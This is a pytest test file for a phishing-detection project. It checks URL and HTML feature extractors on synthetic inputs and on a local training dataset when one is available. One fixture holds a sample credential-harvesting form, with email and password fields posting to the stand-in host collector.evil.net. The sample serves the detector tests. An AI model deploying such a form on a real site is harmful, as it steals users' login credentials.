from pathlib import Path

import pytest

from src.features.html_features import extract_html_features
from src.features.html_features_v2 import extract_html_features_v2
from src.features.url_features import extract_url_features_v1, extract_url_features_v2


PROJECT_ROOT = Path(__file__).resolve().parents[1]
TRAINING_DATA = PROJECT_ROOT / "data" / "raw" / "data"


@pytest.fixture
def synthetic_url():
    return "https://login.example.com/account?next=%2Fhome"


@pytest.fixture
def synthetic_html():
    return """
    <html><head><title>Example Account</title></head>
    <body>
      <form action="https://collector.evil.net/submit">
        <input type="email"><input type="password">
      </form>
      <a href="https://support.example.org/help">Support</a>
    </body></html>
    """


def test_synthetic_url_and_html_features_need_no_dataset(synthetic_url, synthetic_html):
    url_v1 = extract_url_features_v1(synthetic_url)
    url_v2 = extract_url_features_v2(synthetic_url)
    html_v1 = extract_html_features(synthetic_html, synthetic_url)
    html_v2 = extract_html_features_v2(synthetic_html, synthetic_url)

    assert url_v1["has_https"] == 1
    assert url_v1["suspicious_word_count"] >= 1
    assert url_v2["registered_domain"] == "example.com"
    assert html_v1["num_forms"] == 1
    assert html_v1["num_password_inputs"] == 1
    assert html_v1["has_external_form_action"] == 1
    assert html_v2["has_password_and_email_inputs"] == 1
    assert html_v2["num_form_action_domain_mismatches"] == 1


def test_real_training_html_sample_when_local_dataset_is_available():
    parquet_files = sorted(TRAINING_DATA.glob("train-*.parquet"))
    if not parquet_files:
        pytest.skip(
            "requires local training Parquet data at "
            f"{TRAINING_DATA}; the private dataset is not part of CI"
        )

    import pyarrow.parquet as pq

    batch = next(
        pq.ParquetFile(parquet_files[0]).iter_batches(
            batch_size=5,
            columns=["url", "html"],
        )
    )
    for row in batch.to_pylist():
        html_features = extract_html_features(row["html"], row["url"])
        url_features = extract_url_features_v1(row["url"])
        assert html_features["html_length"] >= 0
        assert url_features["url_length"] == len(row["url"])
